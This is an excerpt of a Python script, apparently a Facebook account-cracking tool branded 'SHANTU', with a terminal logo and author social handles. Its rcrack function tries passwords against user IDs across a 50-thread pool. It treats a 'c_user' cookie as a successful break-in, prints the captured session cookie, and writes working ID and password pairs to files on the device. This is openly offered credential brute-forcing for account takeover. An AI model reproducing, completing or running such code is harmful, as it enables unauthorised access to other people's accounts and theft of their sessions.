...
ha = current.day
today = date.today()
#os.system('xdg-open https://www.youtube.com/@SHANTU🚬_yt')
logo = ("""



\033[1;37m[\033[1;32m███████╗██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗\033[1;37m[\033[1;32m
\033[1;37m[\033[1;32m██╔════╝██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗\033[1;37m[\033[1;32m
\033[1;37m[\033[1;32m███████╗███████║███████║██╔██╗ ██║   ██║   ██║   ██║\033[1;37m[\033[1;32m
\033[1;37m[\033[1;32m╚════██║██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║\033[1;37m[\033[1;32m
\033[1;37m[\033[1;32m███████║██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝\033[1;37m[\033[1;32m
...
\033[1;32m[-] GITHUB    :\033[1;32m SHANTOBHAI12
\033[1;32m[-] FACEBOOK  :\033[1;32m SHANTO CHANDRA DAS 
\033[1;92m══════════════════════════════════════════
def linex():
	print('\033[1;93m ***********************************')
loop = 0
...
def clear():
    os.system('clear')
    #os.system('xdg-open https://youtube.com/@s2kshantoboss526?')
    print(logo)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as morshed:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m SHANTU🚬')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SHANTU🚬-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHANTU🚬-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m [SHANTU-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHANTU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}SHANTU {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
